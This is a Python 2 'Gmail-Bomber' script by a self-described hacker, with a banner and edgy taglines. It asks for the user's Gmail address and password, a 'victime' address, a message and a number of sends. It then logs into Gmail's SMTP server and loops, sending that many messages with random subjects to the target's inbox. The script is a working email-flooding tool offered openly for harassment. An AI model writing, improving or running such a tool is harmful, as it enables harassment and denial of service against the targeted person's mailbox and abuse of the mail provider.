# -*- coding: utf-8 -*-
# %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
#%%%%%%%%%%%%%%%%%%%%%%%%%%%%% Date: november 29 , 2018 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%
#%%%%%%%%%%%%%%%%%%%%%%%%%% Weather: It's always cool in the lab %%%%%%%%%%%%%%%%
#%%%%%%%%%%%%%%%%%%%%%%%%%%% Health: Overweight %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
#%%%%%%%%%%%%%%%%%%%%%%%%% Caffeine: 12975 mg %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
#%%%%%%%%%%%%%%%%%%%%%%%%%%% Hacked: All the things %%%%%%%%%%%%%%%%%%%%%%%%%%%%%
#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
# By :                       Cyber Security White Hat Akhil Hacker (VEGETA-LFH)     
# Fb :                         hacker annonymous 18           
# Github :                      https://github.com/posaveeram
# Gmail :                       hackerannonymous18@gmail.com  
############################################# Import some lib #############################
import os
import random
import smtplib
import sys
import getpass
import time
############################ JUST a SHIT ###################
os.system('clear')
rania1 = ("            #do you even \033[91mexist\033[97m ")
rania2 = ('''          #Im \033[92mgood\033[97m at reading \033[93mpeople
          \033[97mMy \033[91msecret\033[97m ? I look for the \033[96mworst\033[97m in them\033[97m''')
rania3 = ("            #'\033[91mlove \033[97mis foreever' \033[97mbullshit\033[97m")
rania4 = ("            #we live in a kingdom of \033[91mbullshit\033[97m")
rania5 = ("            #LEAVE ME \033[91mHERE \033[97m!")
rania6 = ("            #LEAVE ME \033[91mHERE \033[97m!")
def kf_art():
    arts = [rania1, rania2, rania3,rania4,rania5,rania6]
    return random.choice(arts)
print ('''\033[1;31m  \033[97m 
      ________               .__.__              __________              ___.                 
     /  _____/  _____ _____  |__|  |             \______   \ ____   _____\_ |__   ___________ 
    /   \  ___ /     |___  \ |  |  |     ______   |    |  _//  _ \ /     \| __ \_/ __ \_  __ 
    \    \_\  \  Y Y  \/ __ \|  |  |__  /_____/   |    |   (  <_> )  Y Y  \ \_\ \  ___/|  | \/
     \______  /__|_|  (____  /__|____/            |______  /\____/|__|_|  /___  /\___  >__|   
            \/      \/     \/                            \/             \/    \/     \/      
                                                                      By Akhil Hacker
''') 
print(kf_art())
print(" ")
#########################   USER INFO ##########################
user = raw_input('Your Gmail :')
passworde = getpass.getpass('Your Password :')
print(" ")
victime = raw_input('The victime EMAIL :')
message = raw_input('Your Message :')
print(" ")
hani = input('Number of send : ')
print(" ")
print("[*]Sending : ")
############################### SMTP_SERVER INFO ##################
smtp_server = 'smtp.gmail.com'
port = 587

##########################  Login ############################
try:
    server = smtplib.SMTP(smtp_server,port) 
    server.ehlo()
    if smtp_server == "smtp.gmail.com":
            server.starttls()
    server.login(user,passworde)
###################### SENDING #########################################
    for i in range(1, hani+1):
        subject = os.urandom(9)
        msg = 'From: ' + user + '\nSubject: ' + subject + '\n' + message
        server.sendmail(user,victime,msg)
        print ("[✔] Email SENT %i") % i
        sys.stdout.flush()
    server.quit()
    print ('[✔] All Message was sent ')
    
    
except KeyboardInterrupt:
    print ('[✘] Canceled')
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print(" ")
    print("[✘]Error :")
    print ('[✘]The username password you entered is incorrect.')
    print ("Check if the Options of 'Applications are less secure' is enabled ")
    sys.exit()


